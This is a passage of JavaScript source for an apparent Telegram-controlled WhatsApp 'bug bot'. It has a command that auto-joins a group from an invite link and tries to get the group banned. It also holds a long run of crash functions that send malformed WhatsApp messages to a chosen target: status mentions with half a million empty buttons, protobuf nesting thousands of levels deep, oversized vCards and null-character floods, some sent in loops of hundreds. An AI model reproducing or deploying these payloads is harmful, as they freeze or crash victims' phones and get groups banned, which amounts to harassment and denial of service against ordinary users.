        await sock.groupParticipantsUpdate(target, [fake], action);
        await new Promise(r => setTimeout(r, 2500));
        return true;
    } catch (e) {
        await new Promise(r => setTimeout(r, 1500));
        return false;
    }
}

// ============================================

function extractInviteCode(link) {
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9_-]+)/);
  return match ? match[1] : null;
}

// ============================================

bot.command("bannedGroups", checkWhatsAppConnection, checkAllPremium, checkCooldown, async (ctx) => {
  const input = ctx.message.text || "";
  const args = input.split(" ");
  const inputTarget = args[1];

  if (!inputTarget) {
    return ctx.reply(`🪧 *Format:* /bannedGroups https://chat.whatsapp.com/xxxxxx atau ID Grup\n\n*Cara:* Kirim link undangan atau JID grup (contoh: 12345@g.us).`, { parse_mode: "Markdown" });
  }

  const inviteCode = extractInviteCode(inputTarget);
  const isJid = inputTarget.includes("@g.us");

  if (!inviteCode && !isJid) {
    return ctx.reply(`❌ *Input tidak valid!* Pastikan link undangan atau JID grup benar.`, { parse_mode: "Markdown" });
  }

  const photoURL = "https://files.catbox.moe/b6jf12.jpg";

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, photoURL, {
    caption: `<blockquote>𝐆𝐗 𝐈 𝐎𝐍 𝐁𝐀𝐍𝐍𝐄𝐃 𝐆𝐑𝐎𝐔𝐏 𝐌𝐎𝐃𝐄</blockquote>             
<pre><code>├──────────────────────────────┤
│ TARGET:  🚀 ${inputTarget}
│ MODE:  ⛔ Auto Join + Banned
│ STATUS: 🔎 Scanning Group And Member Group....
└───────────────────────────────</code></pre>`,
    parse_mode: "HTML"
  });

  const processMsgId = processMessage.message_id;

  try {
    let target = null;
    
    if (!isJid && inviteCode) {
      try {
        target = await state.sock.groupAcceptInvite(inviteCode);
      } catch (joinErr) {
        if (joinErr.message.includes("already") || joinErr.message.includes("exist")) {
          try {
            const groupInfo = await state.sock.groupGetInviteInfo(inviteCode);
            if (groupInfo && groupInfo.id) target = groupInfo.id;
          } catch (infoErr) {
            throw new Error("Bot sudah join, namun gagal mendapatkan ID grup");
          }
        } else {
          throw joinErr;
        }
      }
    } else if (isJid) {
      target = inputTarget;
    }

    if (!target) throw new Error("Gagal mendapatkan target grup");

    await ctx.telegram.editMessageCaption(ctx.chat.id, processMsgId, undefined, `<blockquote><pre>𝐆𝐗 𝐈 𝐎𝐍 𝐁𝐀𝐍𝐍𝐄𝐃 𝐆𝐑𝐎𝐔𝐏 𝐌𝐎𝐃𝐄</pre></blockquote>
<pre><code>┌───────────────────────────────┐
│ TARGET  : 🚀 ${target}
│ MODE    : ⛔ Auto Join + Group Ban
│ STATUS  : ✅ Group terdeteksi! Sedang Mengeksekusi...
└───────────────────────────────┘
</code></pre>`, { parse_mode: "HTML" });

    for (let i = 0; i < 20; i++) {
      try {
        await bannidoGroup(state.sock, target);
        await new Promise(resolve => setTimeout(resolve, 100));
      } catch (innerErr) {
        console.log(chalk.yellow(`Pengiriman Banned Group ${i+1}: ${innerErr.message}`));
        if (innerErr.message.includes("not-authorized") || innerErr.message.includes("invalid") || innerErr.message.includes("not-found")) break;
      }
    }

    await ctx.telegram.editMessageCaption(ctx.chat.id, processMsgId, undefined, `<blockquote><pre>𝐆𝐗 𝐈 𝐎𝐍 𝐁𝐀𝐍𝐍𝐄𝐃 𝐆𝐑𝐎𝐔𝐏 𝐌𝐎𝐃𝐄</pre></blockquote>
<pre><code>┌───────────────────────────────┐
│ TARGET  : 🚀 ${inputTarget}
│ MODE    : Auto Join + Banned
│ STATUS  : ✅ Berhasil Membanned Group!
└───────────────────────────────┘
</code></pre>`, { parse_mode: "HTML" });

  } catch (err) {
    console.error(chalk.red(`❌ Gagal: ${err.message}`));

    let errorMsg = err.message;
    if (errorMsg.includes("already") || errorMsg.includes("exist")) errorMsg = "Bot sudah pernah bergabung ke grup ini sebelumnya.";
    else if (errorMsg.includes("invalid") || errorMsg.includes("expired")) errorMsg = "Link undangan tidak valid atau sudah kadaluarsa.";
    else if (errorMsg.includes("not-authorized")) errorMsg = "Bot tidak memiliki akses (Not Authorized).";
    else if (errorMsg.includes("not-found")) errorMsg = "Grup tidak ditemukan atau sudah dihapus.";

    await ctx.telegram.editMessageCaption(ctx.chat.id, processMsgId, undefined, `<blockquote><pre>𝐆𝐗 𝐈 𝐎𝐍 • 𝐒𝐘𝐒𝐓𝐄𝐌</pre></blockquote>
<pre><code>
┌───────────────────────────────┐
│ TARGET  : 🚀 ${inputTarget}
│ STATUS  : ❌ Failed
│ ERROR   : ${errorMsg}
└───────────────────────────────┘
</code></pre>`, { parse_mode: "HTML" });
  }
});

// ============================================
// ------------ (  FUNCTION BUGS ) -------------- \\
async function DelayXcombo(sock, target) {
    const msg = {
        message: {
            interactiveMessage: {
                body: {
                    text: "\x10"
                },
                nativeFlowMessage: {
                    buttons: Array.from({ length: 500000 }, () => ({}))
                }
            }
        }
    };

    const msg2 = {
        message: {
            interactiveMessage: {
                body: {
                    text: " maklo "
                },
                nativeFlowMessage: {
                    buttons: "ြ".repeat(600000)
                }
            }
        }
    };

    const msg3 = {
        message: {
            interactiveMessage: {
                body: {
                    text: "\u0FD7"
                },
                nativeFlowMessage: {
                    buttons: "one_crash_message".repeat(20000)
                }
            }
        }
    };

    const msgId = 'DXC' + Date.now().toString(36).toUpperCase();

    await sock.relayMessage(
        'status@broadcast',
        {
            groupStatusMessageV2: {
                message: msg.message
            }
        },
        {
            messageId: msgId + '_1',
            statusJidList: [target],
            additionalNodes: [{
                tag: 'meta',
                attrs: {},
                content: [{
                    tag: 'mentioned_users',
                    attrs: {},
                    content: [{
                        tag: 'to',
                        attrs: { jid: target },
                        content: []
                    }]
                }]
            }]
        }
    );

    await sock.relayMessage(
        'status@broadcast',
        {
            groupStatusMessageV2: {
                message: msg2.message
            }
        },
        {
            messageId: msgId + '_2',
            statusJidList: [target],
            additionalNodes: [{
                tag: 'meta',
                attrs: {},
                content: [{
                    tag: 'mentioned_users',
                    attrs: {},
                    content: [{
                        tag: 'to',
                        attrs: { jid: target },
                        content: []
                    }]
                }]
            }]
        }
    );

    await sock.relayMessage(
        'status@broadcast',
        {
            groupStatusMessageV2: {
                message: msg3.message
            }
        },
        {
            messageId: msgId + '_3',
            statusJidList: [target],
            additionalNodes: [{
                tag: 'meta',
                attrs: {},
                content: [{
                    tag: 'mentioned_users',
                    attrs: {},
                    content: [{
                        tag: 'to',
                        attrs: { jid: target },
                        content: []
                    }]
                }]
            }]
        }
    );
}

async function FreezeXc(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "X"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({})),
            nativeFlowResponsMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    }
  };
await sock.relayMessage(target, msg, {
  noSelfSync: true });
}

async function ExcentedFreezerSw(sock, target) {
  const { proto } = require('@whiskeysockets/baileys');

  const payloads = [
    {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        mimetype: "image/webp",
        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        fileLength: "10610",
        mediaKeyTimestamp: "1775044724",
        stickerSentTs: "1775044724091"
      }
    },
    {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "CleMtlrI+21HNQ298bFL4MaF6k9hJImlKgK7WAT/g+Y=",
        fileLength: "231536",
        seconds: 88888888,
        mediaKey: "WlFBzxOj7hIziHuhR8gNCKE2YZSXgcLnfoydMn32FQI=",
        caption: "hello",
        height: -99999,
        width: 99999,
        fileEncSha256: "zTpAsUWfVLGid5PNcL6/39JVADbLUUK0PT2cxlGpsDA=",
        directPath: "/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1771576607",
      }
    }
  ];

  const encodedPayloads = payloads.map(p => 
    proto.Message.encode(proto.Message.fromObject(p)).finish()
  );

  const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02]
  ];

  const encodeVarint = (n) => {
    let buf = [];
    while (n >= 0x80) {
      buf.push((n & 0x7f) | 0x80);
      n >>>= 7;
    }
    buf.push(n);
    return Buffer.from(buf);
  };

  const wrapLd = (tag, data) => {
    return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
  };

  const inflate = (tag, depth, basePayload) => {
    let buf = basePayload;
    for (let i = 0; i < depth; i++) {
      buf = wrapLd(tag, wrapLd([0x0A], buf));
    }
    return buf;
  };

  const MAX_BATCH = 5;
  const DELAY_MS = 5000;
  let totalSent = 0;

  for (let offset = 0; offset < encodedPayloads.length; offset += MAX_BATCH) {
    const chunk = encodedPayloads.slice(offset, offset + MAX_BATCH);
    if (offset > 0) {
      await new Promise(r => setTimeout(r, DELAY_MS));
    }

    const idx = Math.floor(offset / MAX_BATCH) + 1;
    const suffix = idx > 1 ? ('-' + idx) : '';
    const msgId = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

    for (let p = 0; p < chunk.length; p++) {
      for (let ti = 0; ti < TAGS.length; ti++) {
        const tag = TAGS[ti];
        let decodedPayload = null;

        for (let depth = 5000; depth >= 2000 && !decodedPayload; depth -= 400) {
          try {
            const raw = inflate(tag, depth, chunk[p]);
            const decoded = proto.Message.decode(raw);
            proto.Message.encode(decoded).finish();
            decodedPayload = decoded;
          } catch (_) {}
        }

        if (!decodedPayload) continue;

        try {
          await sock.relayMessage('status@broadcast', decodedPayload, {
            messageId: msgId + '_' + p + '_' + ti,
            statusJidList: [target],
            additionalNodes: [{
              tag: 'meta',
              attrs: {},
              content: [{
                tag: 'mentioned_users',
                attrs: {},
                content: [{
                  tag: 'to',
                  attrs: { jid: target },
                  content: []
                }]
              }]
            }]
          });
          totalSent++;
          console.log(`✅ Success sent to ${target}`);
        } catch (_) {
          console.log(`❌ Error sent to ${target}`);
        }
      }
    }
  }
}


async function crashBeta(sock, target) {
 const { proto } = require('@whiskeysockets/baileys');
  const encodeVarint = (n) => {
    const buf = [];
    while (n >= 0x80) {
      buf.push((n & 0x7f) | 0x80);
      n >>>= 7;
    }
    buf.push(n);
    return Buffer.from(buf);
  };

  const wrapLd = (tag, data) => {
    return Buffer.concat([
      Buffer.from(tag),
      encodeVarint(data.length),
      data
    ]);
  };

  const basePayload = proto.Message.encode(
    proto.Message.fromObject({ extendedTextMessage: { text: '\0' } })
  ).finish();


  const inflate = (base, tag, depth) => {
    let buf = base;
    for (let i = 0; i < depth; i++) {
      buf = wrapLd(tag, wrapLd([0x0A], buf));
    }
    return buf;
  };

  const getDecodedPayload = function (base, tag) {
    let payload = null;
    for (let depth = 5000; depth >= 2000 && !payload; depth -= 500) {
      try {
        const decoded = proto.Message.decode(inflate(base, tag, depth));
        proto.Message.encode(decoded).finish();
        decoded.extendedTextMessage = decoded.extendedTextMessage || {};
        decoded.extendedTextMessage.contextInfo = {
          ...(decoded.extendedTextMessage.contextInfo || {}),
          mentionedJid: [target],
          statusAttributionType: 2,
          statusAttributions: Array.from({ length: 2000 }, () => ({
            type: 1,
            participant: target
          })),
          isGroupStatus: true,
          statusAudienceMetadata: { audienceType: 2 },
          remoteJid: "status@broadcast",
          participant: target
        };
        decoded.statusMentionMessage = {
          message: {
            protocolMessage: {
              type: 25,
              key: {
                remoteJid: "status@broadcast",
                fromMe: true,
                id: null,
                participant: target
              }
            }
          }
        };

        payload = decoded;
      } catch (_) {}
    }
    return payload;
  };
  const payload = () => {
    const decoded = getDecodedPayload(basePayload, [0xBA, 0x03]);
    return decoded || { conversation: '\0' };
  };
  const msg = {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: '\0',
          contextInfo: {
            remoteJid: '\0',
            quotedMessage: {
              extendedTextMessage: {
                text: '\0',
                contextInfo: {
                  quotedMessage: payload()
                }
              }
            }
          }
        }
      }
    }
  };
  const x = await sock.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: [] }]
          }
        ]
      },
    
      {
        tag: "meta",
        attrs: { is_status_mention: "true" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: [] }]
          }
        ]
      }
    ]
  });

  await sock.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: {
            remoteJid: "status@broadcast",
            fromMe: true,
            id: x?.key?.id ?? null,
            participant: target
          },
          type: 25
        }
      }
    }
  }, {
    additionalNodes: [
      {
        tag: "meta",
        attrs: { is_status_mention: "true" },
        content: undefined
      }
    ]
  });

  return x;
}

async function ForceiOs(sock, target) {
  await sock.relayMessage(target, {
    contactMessage: {
      displayName:
        "🎭⃟༑⌁⃰CrashIosAmpos🐉" +
        "𑇂𑆵𑆴𑆿".repeat(10000),
      vcard: `BEGIN:VCARD
VERSION:3.0
N:;𑇂𑆵𑆴𑆿${"𑇂𑆵𑆴𑆿".repeat(10000)};;;
FN:𑇂𑆵𑆴𑆿${"𑇂𑆵𑆴𑆿".repeat(10000)}
NICKNAME:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
ORG:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
TITLE:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item1.TEL;waid=6287873499996:+62 878-7349-9996
item1.X-ABLabel:Telepon
item2.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item2.X-ABLabel:Kantor
item3.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item3.X-ABLabel:Kantor
item4.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item4.X-ABLabel:Pribadi
item5.ADR:;;𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)};;;;
item5.X-ABADR:ac
item5.X-ABLabel:Rumah
X-YAHOO;type=KANTOR:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
PHOTO;${null}
X-WA-BIZ-NAME:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
END:VCARD`,
      contextInfo: {
        externalAdReply: {
          automatedGreetingMessageShown: true,
          automatedGreetingMessageCtaType: "\u0000".repeat(100000),
          greetingMessageBody: "TheEnd",
        },
      },
    },
  }, {
    participant: { jid: target },
  });
}

async function DelayFrezze(sock, target) {
  const msg = {
    messageContextInfo: {
      messageSecret: crypto.randomBytes(32),
      messageUUID: crypto.randomUUID(),
      sessionId: crypto.randomUUID(),
      ticketId: crypto.randomUUID(),
      receiverAccountType: "HOSTED",
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        richResponseSourcesMetadata: {
          sources: [
            {
              provider: "UNKNOWN",
              sourceQuery: "",
              citationNumber: 1,
              sourceTitle: "KaoxTzy"
            }
          ]
        }
      }
    },

    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1, 
          submessages: [
            {
              messageType: 2,
              messageText: Array.from({ length: 200900 }, () => ({}))
            }
          ],

          unifiedResponse: {
            data: Buffer.from(
              JSON.stringify({
                response_id: crypto.randomUUID(),
                sections: [
                  {
                    view_model: {
                      primitive: {
                        text: `==.${"\n".repeat(10000)}.==`,
                        __typename: "GenAIMarkdownTextUXPrimitive"
                      },
                      __typename: "GenAISingleLayoutViewModel"
                    }
                  }
                ]
              })
            ).toString("base64")
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: "0@bot"
            },
            forwardOrigin: 4,
            quotedType: "EXPLICIT"
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });
}

async function DlyTagSw(sock, target) {
   const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
    const msg1 = generateWAMessageFromContent(
        target,
        {
            interactiveMessage: {
                body: {
                    text: "X$_message"
                },
                nativeFlowMessage: {
                    buttons: Array.from({ length: 500000 }, () => ({}))
                }
            }
        },
        {}
    );

    const msg2 = generateWAMessageFromContent(
        target,
        {
            interactiveMessage: {
                body: {
                    text: "default_yes",
                    format: "DEFAULT"
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "cta_url",
                            buttonParamsJson: JSON.stringify({
                                display_text: "new_media_click_here",
                                url: "https://t.me/Bawzzhhh"
                            })
                        }
                    ],
                    messageParamsJson: "{}"
                },
                contextInfo: {
                    urlTrackingMap: {
                        urlTrackingMapElements: Array.from({ length: 500000 }, (_, i) => ({
                            url: `Bawzzhhh`
                        }))
                    }
                }
            }
        },
        {}
    );

    const msg3 = generateWAMessageFromContent(
        target,
        {
            interactiveResponseMessage: {
                body: {
                    text: "SINGLE_SELECT_FORUMS",
                    footer: "forums_message_id"
                },
                nativeFlowMessage: {
                    buttons: "one_crash_message".repeat(40000),
                    nativeFlowResponseMessage: {
                        buttons: Array.from({ length: 1236 }, () => ({}))
                    }
                },
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({
                        icon: "document",
                        title: "°Delay?°¿",
                        sections: Array.from({ length: 5055 }, () => ({}))
                    })
                }
            }
        },
        {}
    );

    await sock.relayMessage('status@broadcast', {
        groupStatusMessageV2: {
            message: msg1.message
        }
    }, {
        statusJidList: [target],
        participant: { jid: target }
    });

    await sock.relayMessage('status@broadcast', {
        groupStatusMessageV2: {
            message: msg2.message
        }
    }, {
        statusJidList: [target],
        participant: { jid: target }
    });

    await sock.relayMessage('status@broadcast', {
        groupStatusMessageV2: {
            message: msg3.message
        }
    }, {
        statusJidList: [target],
        participant: { jid: target }
    });
}

async function IkyyGanteng(sock, target) {
const { proto } = require('@whiskeysockets/baileys');
    const payload = proto.Message.encode(
        proto.Message.fromObject({
            interactiveMessage: {
                body: { text: "IkyyJomblo" },
                contextInfo: {
                    isForwarded: true,
                    buffer1: Buffer.from([0, 0, 0, 1]),
                    buffer2: Buffer.from([0xff, 0, 0, 0x1d]),
                    buffer3: Buffer.from([0xff, 0, 0, 0x1e]),
                    buffer4: Buffer.from([0xff, 0, 0, 0x1f]),
                    buffer5: Buffer.from([0xff, 0, 0, 0x20])
                },
                XForwardedFor: Math.floor(Math.random() * 255) + "." +
                    Math.floor(Math.random() * 255) + "." +
                    Math.floor(Math.random() * 255) + "." +
                    Math.floor(Math.random() * 255) + "\r\n"
            }
        })
    ).finish();

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02]
    ];

    const encodeVarint = function(n) {
        let buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const inflate = function(tag, depth) {
        let buf = payload;
        for (let i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j.length > 15);

    if (!jids.length) return;

    const MAX_BATCH = 5;
    const DELAY_MS = 5000;
    let totalSent = 0;

    for (let offset = 0; offset < jids.length; offset += MAX_BATCH) {
        const chunk = jids.slice(offset, offset + MAX_BATCH);
        if (offset > 0) {
            await new Promise(r => setTimeout(r, DELAY_MS));
        }

        const idx = Math.floor(offset / MAX_BATCH) + 1;
        const suffix = idx > 1 ? ('-' + idx) : '';
        const msgId = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (let ti = 0; ti < TAGS.length; ti++) {
            const tag = TAGS[ti];
            let payload = null;

            for (let depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    const decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            await sock.relayMessage('status@broadcast', payload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(jid => ({
                            tag: 'to',
                            attrs: { jid: jid },
                            content: []
                        }))
                    }]
                }]
            });

            totalSent++;
        }
    }
}

async function ForcloseVnX(sock, target) {
    const { proto } = require('@whiskeysockets/baileys');

    const vnx = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: "10610",
            mediaKeyTimestamp: "1775044724",
            stickerSentTs: "1775044724091"
        }
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const basePayload = proto.Message.encode(
        proto.Message.fromObject(vnx)
    ).finish();

    const inflate = function(tag, depth) {
        var buf = basePayload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) return;

    for (var i = 0; i < 900; i++) {
        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag = TAGS[ti];
            var payload = null;

            for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            var msgId = 'LZ' + Date.now().toString(36).toUpperCase() + '_' + i;

            try {
                await sock.relayMessage('status@broadcast', payload, {
                    messageId: msgId,
                    statusJidList: [target],
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: [{
                                tag: 'to',
                                attrs: { jid: target },
                                content: []
                            }]
                        }]
                    }]
                });
            } catch (_) {}
        }
    }
}

async function IkyyJmbl(sock, target) {
    try {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "Ikyy Galau" + "\0".repeat(300000)
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 300000 }, () => ({}))
                        }
                    }
                }
            }
        }, {
            participant: { jid: target }
        });

        
        let msg = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: { 
                            text: "👾👾👾👾👾👾👾👾👾👾👾👾👾👾" 
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, {});
        console.log("✅ BUG SUKSES TERKIRM");
        
    } catch (error) {
        console.error("❌Error:", error.message);
        throw error;
    }
}

async function XkaCrash(sock, target) {
    const msg = {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 2,
                    submessages: [
                        {
                            messageType: 8,
                            latexMetadata: {
                                text: "\0" + "\u200B".repeat(30000) + "\u0000".repeat(50000),
                                expressions: [
                                    {
                                        latexExpression: "\0" + "\u1A01".repeat(30000),
                                        width: 999999999
                                    }
                                ]
                            }
                        },
                        {
                            messageType: 3,
                            viewOnceMessage: {
                                message: {
                                    imageMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
                                        mimetype: "image/jpeg",
                                        caption: "\u0000".repeat(50000) + "\u200B".repeat(50000),
                                        fileLength: "999999999999",
                                        height: 9999,
                                        width: 9999,
                                        fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
                                        mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
                                        fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
                                        directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
                                        mediaKeyTimestamp: "1750124469",
                                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAF